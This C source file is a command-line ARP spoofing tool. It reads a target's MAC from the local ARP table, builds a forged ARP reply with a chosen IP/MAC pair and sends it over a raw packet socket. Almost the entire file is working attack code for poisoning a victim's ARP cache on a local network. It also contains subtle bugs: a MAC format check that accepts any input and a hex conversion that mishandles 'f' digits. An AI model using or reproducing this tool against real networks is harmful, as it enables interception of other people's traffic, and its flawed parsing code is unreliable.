 /*  Copyright (C) 2013-2016  Vegetable avenger (r7418529@gmail.com)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


/*

 BUG list:
	1. using unlink interface to send pakcet , may cause an error
	2. -P flag unuse
*/




/*
Version 1.0 : 	Basic ARP Spoofing function
Version 1.1 : 	Add Control Operatior (-t , -s)
Version 1.2 : 	Add -i Control Operator ,
		Update Localhost IP/MAC information fetch function ,
		Enhance -t Operator , add ARP table lookup capability .
*/

// Send an IPv4 ARP Spoofing packet via raw socket

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <bits/ioctls.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>
//--------------------------------------------------------------------------
// the color of printf
#define P_NONE "\033[m"
#define P_RED "\033[0;32;31m"
#define P_GREEN "\033[0;32;32m"
//--------------------------------------------------------------------------
// ARP header
struct ARP_header
{
	unsigned short	Hardware ;
	unsigned short	Protocol ;
	unsigned char	HardwareAddressLen ;
	unsigned char	ProtocolAddressLeng ;
	unsigned short	Operation ;
	unsigned char	SoruceHardareAddr[6] ;
	unsigned char	SourceProtocolAddr[4] ;
	unsigned char	TargetHardareAddr[6] ;
	unsigned char	TargetProtocolAddr[4] ;
};

//--------------------------------------------------------------------------
// system flag
int Pass_flag =0 ;	// -P , pass data format resolution check
int I_flag =0 ;		// -i , interface flag
int S_flag =0 ;		// -s , spoofing
int T_flag =0 ;		// -t , Target IP flag

//--------------------------------------------------------------------------
// **************************************
// MAC address format check function
// **************************************
//
// this function work for check MAC address format
// it return 1 for match format , otherwise 0 for failed .

static int MAC_FormatCheck(char * argv)
{
	if(strlen(argv) !=17)
	    goto FormatError ;
	else
	{
	    for(int i=0 ; i<6 ;i++)
	    {
                char num1 =*(argv+i*3) ;
                char num2 =*(argv+i*3+1) ;
		char dot  =*(argv+i*3+2) ;
	    	if(i<5 && dot !=':') //last set no :
		    goto FormatError ;
		if(!((num1 >='a' || num1 <='e') ||
		     (num1 >='A' || num1 <='E') ||
		     (num1 >='0' || num1 <='9')) ||
		   !((num2 >='a' || num2 <='e') ||
                     (num2 >='A' || num2 <='E') ||
                     (num2 >='0' || num2 <='9')))
		    goto FormatError ;
	    }
	}
	return 1 ;

FormatError :
	return 0;
}
//--------------------------------------------------------------------------
// ***************************************
// MAC format tramsform(Danger function)
// ***************************************
//
// this function work for transform MAC data to decimal ,
// argc is two byte character data ,
// per MAC data call this function six times .
static int MAC_SubFormatTransform(char * argv)
{
    char num1 =*(argv) ;
    char num2 =*(argv+1) ;
    int ret =0;

    if(num1 <='9') ret +=(num1-'0') *16 ;
    else if(num1 <='e') ret +=(num1-'a' +10) *16 ;
    else if(num1 <='E') ret +=(num1-'A' +10) *16 ;

    if(num2 <='9') ret +=(num2-'0') ;
    else if(num2 <='e') ret +=(num2-'a' +10) ;
    else if(num2 <='E') ret +=(num2-'A' +10) ;

    return ret ;
}
//--------------------------------------------------------------------------
// ********************************
// Argument s resolution function
// *********************************
//
// this function work for Resolution -s operator ,
// it will return 1 for success , and 0 for faile ,
// if resolution success , Ret_IP and Ret_MAC will be Ethernet packet format due to argv .

static int Arg_s_Resolution(char *argv ,char *Ret_IP ,char *Ret_MAC)
{
	char IP_s[16] ="";
	char MAC_s[18] ="";
	int IP_i =0;
	int MAC_i =0;
	int slash =0;
	int argvLen = strlen(argv);
	unsigned int tSpoofing_IP =-1 ;

	// devide argv in two part , IP and MAC , devided by '/'
	for(int i=0 ;i<argvLen ;i++)
	{
	    if(*(argv+i) == '/' && slash==0) // chech slash find or not
		slash =1;
	    else if(slash == 0) // save IP data
	    {
		if(IP_i==15) // Error : IPv4 IP formate max 14 character ,OOO.OOO.OOO.OOO
		    goto ResError ;
		IP_s[IP_i]= *(argv+i) ;
		IP_i ++ ;
	    }
	    else if(slash == 1) // save MAC data
            {
                if(MAC_i==17) // Error : MAC formate max 17 character ,XX:XX:XX:XX:XX:XX
                    goto ResError ;
		MAC_s[MAC_i]= *(argv+i) ;
                MAC_i ++ ;
            }
	    else
		goto ResError ;
	}

	// resolution IP to ethernet format
	tSpoofing_IP = inet_addr(IP_s);
	if(tSpoofing_IP ==-1)
	    goto ResError ;
        memcpy(Ret_IP , &tSpoofing_IP ,sizeof(int));

	// resolution MAC to ethernet format
	if(MAC_FormatCheck(MAC_s)==0)
	    goto ResError ;
	for(int i=0 ; i<6 ;i++)
	{
	    Ret_MAC[i] = MAC_SubFormatTransform(&MAC_s[i*3]) ;
	}

	return 1;

ResError :
	memset(Ret_IP ,0 ,sizeof(char)*15);
	memset(Ret_MAC ,0 ,sizeof(char)*17);
	return 0 ;
}
//--------------------------------------------------------------------------
// **********************************
// Get Localhost Interface information
// **********************************
//
// get localhost MAC and IP via iface
int getInterfaceInfo(unsigned char * iface ,unsigned char *local_IP ,unsigned char *local_MAC )
{
	// Get MAC address
	char tMAC[18]="";
	char ifPath[256]="/sys/class/net/";
        strcat(ifPath ,(char*)iface);
        strcat(ifPath ,"/address");

	FILE *if_f =fopen(ifPath , "r");
	if(if_f == NULL)
	    return 0 ;
	else
	{
	    fread(tMAC ,1 ,17 ,if_f);		//read MAC from /sys/class/net/iface/address
	    fclose(if_f) ;
	    for(int i=0 ; i<6 ;i++)		// confirm data to  local_MAC
            {
                *(local_MAC+i) = MAC_SubFormatTransform(&tMAC[i*3]) ;
            }
	}

	// Get IP address
	// using ioctrl to get local IP ,
	// it may not bt an best way to achive that , i still search another way
	int fd;
	struct ifreq ifr;
	in_addr tIP ;

	fd = socket(AF_INET, SOCK_DGRAM, 0);	//using ioctl get IP address
	ifr.ifr_addr.sa_family = AF_INET;
	strcpy(ifr.ifr_name , (char*)iface);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);

	tIP =((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
	memcpy((char*)local_IP , &tIP ,sizeof(in_addr));

	return 1;
}
//--------------------------------------------------------------------------
// ************************************
// Fetch Localhosdt ARP table
// ************************************
// find IP or MAC from  localhost arp table ,

#define FETCH_ARP_TABLE_ERROR		0x0000		// could not access localhost ARP table
#define FETCH_ARP_TABLE_SUCCESS		0x0001		// find ARP entry
#define FETCH_ARP_TABLE_UNKNOW		0x0002		// ARP entry unknow or empty

int FetchARPTable(char * TargetIP , char * TargetMAC)
{
	// ARP table at /proc/net/arp

	int ret =FETCH_ARP_TABLE_UNKNOW;
	FILE *ARP_f =fopen("/proc/net/arp" , "r");

        if(ARP_f == NULL)
        {
	    ret =FETCH_ARP_TABLE_ERROR;
	}
	else
	{
	    // pass title
	    char Title[100] ;		//file title , pass that
	    fgets(Title ,100 ,ARP_f);

	    char t_IP[15] ;
	    char t_HW_type[8] ;
	    char t_Flags[8] ;
	    char t_MAC[17] ;
	    char t_Mask[5] ;
	    char t_Device[16] ;
	    while(!feof(ARP_f)) //search arp table
	    {
		fscanf(ARP_f ,"%s %s %s %s %s %s",t_IP,t_HW_type,t_Flags,t_MAC,t_Mask,t_Device);
		if(strcmp(t_IP ,TargetIP)==0 &&
		   strcmp(t_Flags ,"0x2")==0)
		{
		    //printf("%s|%s|%s|%s|%s|%s\n",t_IP,t_HW_type,t_Flags,t_MAC,t_Mask,t_Device) ;	// if you want to look data , unmark that
		    ret =FETCH_ARP_TABLE_SUCCESS;
		    // copy data to Target_MAC
		    for(int i=0 ; i<6 ;i++)
        	    {
		        *(TargetMAC+i) = MAC_SubFormatTransform(&t_MAC[i*3]) ;
	            }
		    break ;
		}
	    }
	    fclose(ARP_f);
        }
	return ret ;
}

//--------------------------------------------------------------------------
// ********************
// ARP spoofing main
// ********************
int main(int argc, char* argv[])
{
	unsigned char NetInterface[16] 	="eth0";
	unsigned char Target_IP[4]	={0};	// Target IP
	unsigned char Soruce_IP[4] 	={0};	// localhost IP
	unsigned char Spoofing_IP[4] 	={0};	// Spoofing IP
	unsigned char Target_MAC[6] 	={0};	// TargetMAC , this value will lookup ARP table
	unsigned char Soruce_MAC[6] 	={0};	// localhost MAC;
	unsigned char Spoofing_MAC[6] 	={0};	// spoofing MAC
	unsigned char EthernetFrame[64] ={0};	// ethernet frame

	int opt;
	// opterr =0; //  disable getopt error message
	while((opt=getopt(argc, argv, "Pi:t:s:")) != -1)
	{
	    switch(opt)
	    {
		case 'i': // interface
		{
		    int iLen =strlen(optarg);
		    if(iLen<16)
		    {
			char ifPath[256]="/sys/class/net/";
			strcat(ifPath ,optarg);
			strcat(ifPath ,"/address");
			struct stat buf;
			if(stat(ifPath,&buf) == 0)
 			{
			    I_flag  =1 ;
                            memcpy(NetInterface , optarg ,sizeof(char)*iLen);
			}
			else
			    printf(P_RED "Error" P_NONE ": Unknow interface : [" P_GREEN "%s" P_NONE "]\n",optarg);
		    }
		    else
			printf(P_RED "Error" P_NONE ": Interface identify size unmatch , please fix source code\n");
		}
		break ;

        	case 't': // target IP
		{
		    // check IP format
		    unsigned int tTarget_IP = inet_addr(optarg);
                    if(tTarget_IP !=-1)
                    {
			// Get target MAC from ARP table
		    	if(FetchARPTable((char*)optarg ,(char*)Target_MAC)==FETCH_ARP_TABLE_SUCCESS)
			{
			    memcpy(Target_IP , &tTarget_IP ,sizeof(int));
			    T_flag =1 ;
			}
		    	else
			    printf(P_RED "Error" P_NONE ": Target IP [" P_GREEN "%s" P_NONE "] ,ARP table lookup failed \n",optarg);
		    }
		    else
			printf(P_RED "Error" P_NONE ": Target IP [" P_GREEN "%s" P_NONE "] ,format resolution failed \n",optarg);
		}
		break ;

	        case 's': // spoofing IP and mac
		{
		    if(Arg_s_Resolution(optarg ,(char*)&Spoofing_IP[0] ,(char*)&Spoofing_MAC[0] )==0)
			printf(P_RED "Error" P_NONE ": Spoofing data resolution failed\n");
		    else
			S_flag =1;
	        }
		break;
		case 'P':
		{
		    Pass_flag =1;
		}
		break ;
		default :
		    printf(P_RED "Error" P_NONE ":Unkonw Argument\n!");
		break ;
    	    }
	}

	// chech flag
	if(I_flag ==0 ||
	   S_flag ==0 ||
	   T_flag ==0 ||
	   getInterfaceInfo(NetInterface , Soruce_IP ,Soruce_MAC) == 0) // Get localhost IP and MAC
	{
	    printf("ARP_Spoofing Error\n");
	    exit(-1);
	}

	// set ARP header
	ARP_header ARP_Spoofing ;
	ARP_Spoofing.Hardware = htons (1);
	ARP_Spoofing.Protocol = htons (2048);
	ARP_Spoofing.HardwareAddressLen = 6;
	ARP_Spoofing.ProtocolAddressLeng =4 ;
	ARP_Spoofing.Operation = htons(2);
	memcpy(ARP_Spoofing.SoruceHardareAddr  ,Spoofing_MAC	,sizeof(char)*6);
	memcpy(ARP_Spoofing.SourceProtocolAddr ,Spoofing_IP	,sizeof(char)*4);
	memcpy(ARP_Spoofing.TargetHardareAddr  ,Target_MAC,sizeof(char)*6);
	memcpy(ARP_Spoofing.TargetProtocolAddr ,Target_IP ,sizeof(char)*4);

	memcpy(EthernetFrame ,Target_MAC ,sizeof(char)*6);
	memcpy(EthernetFrame+6 ,Soruce_MAC ,sizeof(char)*6);
	EthernetFrame[12] = ETH_P_ARP / 256;
	EthernetFrame[13] = ETH_P_ARP % 256;

	// copy ARP header to ethernet packet
	memcpy (EthernetFrame + 14, &ARP_Spoofing, sizeof (char)*28);
	/*------------------------------------------*/
	 int ARPSocket ;

        // create socket
        printf("Create RAW Socket ... ");
        if( (ARPSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) )) <0)
	{
            printf("Faile\n");
            exit(-1);
	}
        printf("Successfully\n");

	// Get Interface ibdex
	struct sockaddr_ll device;
	if ((device.sll_ifindex = if_nametoindex ((const char*)NetInterface)) == 0)
	{
 	    printf("if_nametoindex() failed to obtain interface index ");
    	    exit (EXIT_FAILURE);
  	}
	printf ("Index for interface %s is %i\n", "eth0", device.sll_ifindex);
	device.sll_family = AF_PACKET;
  	device.sll_halen = htons (6);

	// Send packet to NIC
	if (sendto (ARPSocket, EthernetFrame, 42, 0, (struct sockaddr *) &device, sizeof (device)) <= 0)
	{
	    perror ("sendto() failed");
	    exit (EXIT_FAILURE);
	}

	// close socket
	close(ARPSocket);

	// free data
	printf("finish\n");
}
